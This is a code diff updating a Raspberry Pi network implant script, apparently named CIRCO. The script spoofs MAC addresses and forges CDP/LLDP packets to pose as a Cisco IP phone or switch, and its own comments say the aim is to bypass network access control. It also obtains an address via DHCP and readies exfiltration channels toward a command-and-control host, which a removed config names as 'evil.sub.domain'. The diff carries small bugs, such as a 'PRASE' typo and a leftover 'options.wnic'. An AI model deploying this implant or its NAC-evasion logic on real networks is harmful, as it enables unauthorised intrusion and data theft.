@@ -1,6 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-from __future__ import print_function
+import configparser
+import logging
+from pyfiglet import Figlet
+from plugins.honeypots.cdp import CDPHandler
+from plugins.honeypots.lldp import LLDPHandler
+from plugins.honeypots.sshd import SSHHandler
+from plugins.honeypots.telned import TELNETHandler
+#
 import subprocess
 import os
 import signal
@@ -19,17 +26,12 @@ import pyaes
 import pyscrypt
 import dns.resolver
 import requests
-from pyfiglet import Figlet
 import RPi.GPIO as GPIO
-# Remove Scapy IPv6 Warning
-sys.stderr = None
 from scapy.all import *
-# Revert back the STD output
-sys.stderr = sys.__stderr__
 
 # Me
 __author__ = "Emilio / @ekio_jp"
-__version__ = "1.5"
+__version__ = "2.0"
 
 # Default options OFF
 DEBUG = False
@@ -41,26 +43,6 @@ EWEB = False
 ESSL = False
 EPRX = False
 ENTP = False
-
-# Config
-PHRASE = 'Waaaaa! awesome :)'
-SALT = 'salgruesa'
-WIFICHANNEL = '10'
-# this MAC is whitelisted in ForeScout NAC
-switchmac = '00:07:B4:00:FA:DE'
-switchport = 'FastEthernet0/3'
-phonemac = '10:8C:CF:75:BB:AA'
-serial = 'FCW1831C1AA'
-snpsu = 'LIT18300QBB'
-snmpcommunity = 'public'
-cchost = '200.200.200.1'
-ccname = 'evil.sub.domain'
-dirname = '/home/pi-enc/circo/circo/'
-# fake-ssid (need to match jaula.py)
-SSIDroot = 'aterm-c17c02'
-SSIDalarm = 'pacman'
-# BSSID MAC from NEC ATERM routers
-wifimac = '98:f1:99:c1:7c:02'
 
 # Perm files
 snmptpl = dirname + 'Cisco_2960-tpl.snmpwalk'
@@ -476,10 +458,11 @@ class DHCPHandler(threading.Thread):
     """
     Class for DHCP responses, parse it and return the details
     """
-    def __init__(self, iface):
+    def __init__(self, iface, mac):
         threading.Thread.__init__(self)
         self.stoprequest = threading.Event()
         self.iface = iface
+        self.mac = mac
         self.offer = 1
         self._rtn_ip = None
         self._rtn_mask = None
@@ -493,8 +476,7 @@ class DHCPHandler(threading.Thread):
             mtype = pkt[DHCP].options[0][1]
             ipaddr = pkt[BOOTP].yiaddr
             sip = pkt[BOOTP].siaddr
-            mac = get_if_hwaddr(self.iface)
-            if (mtype == 2) and (self.offer <= 1) and (pkt[Ether].dst == mac):
+            if (mtype == 2) and (self.offer <= 1) and (pkt[Ether].dst == self.mac):
                 self.offer = self.offer + 1
                 for opt in pkt[DHCP].options:
                     if 'router' in opt:
@@ -514,7 +496,7 @@ class DHCPHandler(threading.Thread):
                 self._rtn_dns_srv = dns_srv
                 self._rtn_domain = domain
                 self._rtn_pac = pac
-                request = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                request = (Ether(src=self.mac, dst="ff:ff:ff:ff:ff:ff") /
                            IP(src="0.0.0.0", dst="255.255.255.255") /
                            UDP(sport=68, dport=67) /
                            BOOTP(chaddr=pkt[BOOTP].chaddr,
@@ -782,6 +764,34 @@ def encrypt(cleartxt):
     ciphertxt = aes.encrypt(cleartxt)
     return ciphertxt.encode('hex')
 
+# DHCP Client
+def dhcpclient(iface, mac):
+    dh = DHCPHandler(iface, mac)
+    dh.daemon = True
+    dh.start()
+    time.sleep(0.5)
+    chaddr = ''.join([chr(int(x, 16)) for x in mac.split(':')])
+    xid = random.randint(0, 0xFFFF)
+    dhcpdiscover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                    IP(src="0.0.0.0", dst="255.255.255.255") /
+                    UDP(sport=68, dport=67) /
+                    BOOTP(chaddr=chaddr, xid=xid) /
+                    DHCP(options=[('message-type', 'discover'), 'end'])
+                   )
+    sendp(dhcpdiscover, iface=iface, verbose=0)
+    time.sleep(10)
+    ip, netmask, gwip, dns_srv, domain, pac = dh.join()
+    return ip, netmask, gwip, dns_srv, domain, pac
+
+# Grab gateway ARP
+def getarp(iface, src_mac, src_ip, dst_ip):
+    """
+    Send ARP WHO-HAS to grab MAC from default gateway
+    """
+    query = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=src_ip, pdst=dst_ip)
+    ans, a = srp(query, iface=iface, timeout=2, verbose=0)
+    for a, rcv in ans:
+        return rcv[Ether].src
 
 def parsingopt():
     f = Figlet(font='standard')
@@ -792,10 +802,10 @@ def parsingopt():
     command_group_mode = parser.add_mutually_exclusive_group(required=True)
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Enable debugging')
-    command_group_mode.add_argument('-i', dest='nic', metavar='<eth0>',
+    command_group_mode.add_argument('-i', dest='single', metavar='<eth0>',
                         help='Single Mode: <eth0>')
     command_group_mode.add_argument('-b', '--bridge', action='store_true',
-                        help='Bridge Mode: Use eth0 & eth1')
+                        help='Bridge Mode: Use eth0 (LAN) & eth1 (Phone)')
     parser.add_argument('-A', '--ALL', action='store_true',
                         help='All exfiltration except wifi')
     parser.add_argument('-p', '--ping', action='store_true',
@@ -824,26 +834,57 @@ def parsingopt():
         sys.exit(1)
 
 
-# Main Function
 
 def main():
-    global DEBUG
-    global EAP
-    global EPING
-    global ETRACE
-    global EDNS
-    global EWEB
-    global ESSL
-    global EPRX
-    global ENTP
-    options = parsingopt()
-    if options.verbose:
-        DEBUG = True
-    if options.nic:
-        iface = options.nic
-    elif options.bridge:
-        iface = 'br0'
-    if options.ALL:
+    """
+    Core program for CIRCO
+    """
+
+    # Grab arguments
+    opt = parsingopt()
+    if opt.single:
+        IFACE = opt.single
+    elif opt.bridge:
+        IFACE = 'br0'
+
+    # Create logger
+    logger = logging.getLogger()
+    ch_handler = logging.StreamHandler()
+    ch_format = logging.Formatter('%(asctime)s - %(levelname)s: %(message)s',
+                                  datefmt='%d-%b-%y %H:%M:%S')
+    if opt.verbose:
+        ch_handler.setLevel(logging.DEBUG)
+        logger.setLevel(logging.DEBUG)
+    else:
+        ch_handler.setLevel(logging.INFO)
+        logger.setLevel(logging.INFO)
+    ch_handler.setFormatter(ch_format)
+    logger.addHandler(ch_handler)
+
+    # Grab circo.ini config
+    config = configparser.ConfigParser()
+    if config.read('circo.ini'):
+        PRASE = config['cfg']['phrase']
+        SALT = config['cfg']['salt']
+        WIFICHAN = config['cfg']['wifichannel']
+        SWMAC = config['cfg']['switchmac']
+        SWPORT = config['cfg']['switchport']
+        PHONEMAC = config['cfg']['phonemac']
+        PHONENAME = config['cfg']['phonename']
+        SWSN = config['cfg']['serial']
+        SWPSUSN = config['cfg']['serialpsu']
+        COMMUNITY = config['cfg']['snmpcommunity']
+        CCHOST = config['cfg']['cchost']
+        CCNAME = config['cfg']['ccname']
+        DIRNAME = config['cfg']['dirname']
+        SSIDROOT = config['cfg']['ssidroot']
+        SSIDALARM = config['cfg']['ssidalarm']
+        WIFIMAC = config['cfg']['wifimac']
+    else:
+        logger.error('circo.ini not found')
+        sys.exit(1)
+
+    if opt.ALL:
         EPING = True
         ETRACE = True
         EDNS = True
@@ -851,38 +892,33 @@ def main():
         ESSL = True
         EPRX = True
         ENTP = True
-    if options.wnic:
+    if opt.wnic:
         wiface = options.wnic
         EAP = True
-    if options.ping:
+    if opt.ping:
         EPING = True
-    if options.trace:
+    if opt.trace:
         ETRACE = True
-    if options.dns:
+    if opt.dns:
         EDNS = True
-    if options.web:
+    if opt.web:
         EWEB = True
-    if options.ssl:
+    if opt.ssl:
         ESSL = True
-    if options.prx:
+    if opt.prx:
         EPRX = True
-    if options.ntp:
+    if opt.ntp:
         ENTP = True
 
     # Load Scapy modules
     load_contrib("cdp")
     load_contrib("lldp")
 
-    # Bring LAN interface up
-    if options.nic:
-        # Change MAC, became a Cisco IP-Phone!
-        if DEBUG:
-            print('MAC change started - phone')
-        changemac(iface, phonemac)
-        if DEBUG:
-            print('MAC change ended - phone')
-    if options.bridge:
-        # Bring Bridge interface up
+    if opt.single:
+        _discover_int = IFACE
+        _change_mac = PHONEMAC
+    elif opt.bridge:
+        logger.debug('Setting Bridge Interface')
         subprocess.call('/sbin/brctl addbr br0', shell=True)
         subprocess.call('/sbin/brctl addif br0 eth0', shell=True)
         subprocess.call('/sbin/brctl addif br0 eth1', shell=True)
@@ -890,93 +926,45 @@ def main():
         subprocess.call('/sbin/ifconfig br0 up', shell=True)
         subprocess.call('/sbin/ifconfig eth0 up', shell=True)
         subprocess.call('/sbin/ifconfig eth1 up', shell=True)
-        # Change MAC, became a Cisco Switch!
-        if DEBUG:
-            print('MAC change started - switch')
-        changemac(iface, switchmac)
-        if DEBUG:
-            print('MAC change ended - switch')
+        _discover_int = 'eth0'
+        _change_mac = SWMAC
 
-    # Listen for CDP packets to get hostname from it
-    if DEBUG:
-        print('CDP/LLDP discover started')
-    if options.bridge:
-        discover('eth0')
-    else:
-        discover(iface)
-    if DEBUG:
-        print('CDP/LLDP discover ended')
+    logger.debug('Setting MAC address')
+    changemac(IFACE, _change_mac)
 
-    # Grab an IP using DHCP
-    if DEBUG:
-        print('DHCP started')
-    dh = DHCPHandler(iface)
-    dh.daemon = True
-    dh.start()
-    time.sleep(0.5)
-    mac = get_if_hwaddr(iface)
-    chaddr = ''.join([chr(int(x, 16)) for x in mac.split(':')])
-    xid = random.randint(0, 0xFFFF)
-    dhcpdiscover = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-                    IP(src="0.0.0.0", dst="255.255.255.255") /
-                    UDP(sport=68, dport=67) /
-                    BOOTP(chaddr=chaddr, xid=xid) /
-                    DHCP(options=[('message-type', 'discover'), 'end'])
-                   )
-    sendp(dhcpdiscover, iface=iface, verbose=0)
-    time.sleep(10)
-    ip, netmask, gwip, dns_srv, domain, wpad = dh.join()
+    logger.debug('Discovering Real Switch Name via CDP/LLDP')
+    _real_name = discover(_discover_int)
+
+    logger.debug('DHCP Client')
+    ip, netmask, gwip, dns_srv, domain, pac = dhcpclient('eth0', SWMAC)
+
     # TODO
     # need to add module for static ip in case DHCP doesn't work
-    if DEBUG:
-        print('DHCP ended')
 
     # Configure interface
-    if DEBUG:
-        print('Interface config started')
-    setip(iface, ip, netmask, gwip, dns_srv)
-    if DEBUG:
-        print('Interface config ended')
+    logger.debug('Configure IP')
+    setip(IFACE, ip, netmask, gwip, dns_srv)
 
     # Capture ARP responses
-    if DEBUG:
-        print('ARP gw started')
+    logger.debug('Get Gateway MAC Address')
+    gwmac = getarp(IFACE, get_if_hwaddr(IFACE), ip, gwip)
 
-    # Send ARP WHO-HAS to grab MAC from default gateway
-    query = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, psrc=ip, pdst=gwip)
-    ans, a = srp(query, iface=iface, timeout=2, verbose=0)
-    for a, rcv in ans:
-        gwmac = rcv[Ether].src
-        break
-
-    if DEBUG:
-        print('ARP gw ended')
-
-    if options.nic:
-        # Pretend to be a phone to bypass NAC, tune the amount of time you want
-        cdpdh = CDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
+    if opt.single:
+        # Pretend to be IP Phone to bypass NAC, tune the amount of time you want to run
+        cdpdh = CDPHandler(IFACE, PHONEMAC, ip, PHONENAME, 'Port 1', None, 'phone')
+        lldpdh = LLDPHandler(iface, PHONEMAC, ip, PHONENAME, 'Port 1', None, 'phone')
         cdpdh.daemon = True
+        lldpdh.daemon = True
         cdpdh.start()
+        lldpdh.start()
         # Stop calling .join() after X seconds (default 60sec)
-        if DEBUG:
-            print('CDPd started - phone')
+        logger.debug('Sending CDP/LLDP Phone packets')
+        if opt.verbose:
+            logger.debug('CDP/LLDP stop after 10sec')
             time.sleep(10)
-            print('CDPd stoped (60sec) - phone (verbose 10sec)')
         else:
             time.sleep(60)
         cdpdh.join()
-
-        # Fake LLDP for phone
-        lldpdh = LLDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
-        lldpdh.daemon = True
-        lldpdh.start()
-        # Stop calling .join() after X seconds (default 60sec)
-        if DEBUG:
-            print('LLDP started - phone')
-            time.sleep(10)
-            print('LLDPd stoped (60sec) - phone (verbose 10sec)')
-        else:
-            time.sleep(60)
         lldpdh.join()
 
     if EPRX:
